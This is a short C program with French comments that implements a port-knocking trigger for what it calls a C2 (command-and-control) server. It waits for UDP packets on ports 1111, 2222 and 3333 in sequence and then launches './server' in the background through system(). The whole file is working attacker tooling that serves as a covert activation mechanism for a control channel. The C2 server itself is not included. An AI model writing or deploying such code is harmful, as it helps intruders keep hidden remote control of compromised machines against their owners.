#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define KNOCK_PORT_1 1111
#define KNOCK_PORT_2 2222
#define KNOCK_PORT_3 3333
#define C2_PORT 4444

void start_c2() {
    printf("[INFO] Knock correct, lancement du serveur C2...\n");
    system("./server "); // Lancer le serveur C2 en arrière-plan
}

int main() {
    int sock[3];
    struct sockaddr_in server_addr[3], client_addr;
    socklen_t addr_size;
    char buffer[1024];

    int knock_ports[] = {KNOCK_PORT_1, KNOCK_PORT_2, KNOCK_PORT_3};
    int knock_received[3] = {0, 0, 0};

    // Création de sockets UDP pour chaque port
    for (int i = 0; i < 3; i++) {
        sock[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock[i] < 0) {
            perror("Erreur socket");
            exit(1);
        }

        memset(&server_addr[i], 0, sizeof(server_addr[i]));
        server_addr[i].sin_family = AF_INET;
        server_addr[i].sin_addr.s_addr = INADDR_ANY;
        server_addr[i].sin_port = htons(knock_ports[i]);

        if (bind(sock[i], (struct sockaddr*)&server_addr[i], sizeof(server_addr[i])) < 0) {
            perror("Erreur bind");
            exit(1);
        }
    }

    printf("[INFO] En attente du knock secret...\n");

    // Attente des knocks dans l'ordre
    for (int i = 0; i < 3; i++) {
        addr_size = sizeof(client_addr);
        recvfrom(sock[i], buffer, sizeof(buffer), 0, (struct sockaddr*)&client_addr, &addr_size);
        printf("[INFO] Knock reçu sur le port %d\n", knock_ports[i]);
        knock_received[i] = 1;
    }

    // Vérification si la séquence complète est reçue
    if (knock_received[0] && knock_received[1] && knock_received[2]) {
        start_c2();
    } else {
        printf("[ERROR] Séquence incorrecte, serveur C2 NON lancé !\n");
    }

    // Fermer les sockets
    for (int i = 0; i < 3; i++) {
        close(sock[i]);
    }

    return 0;
}
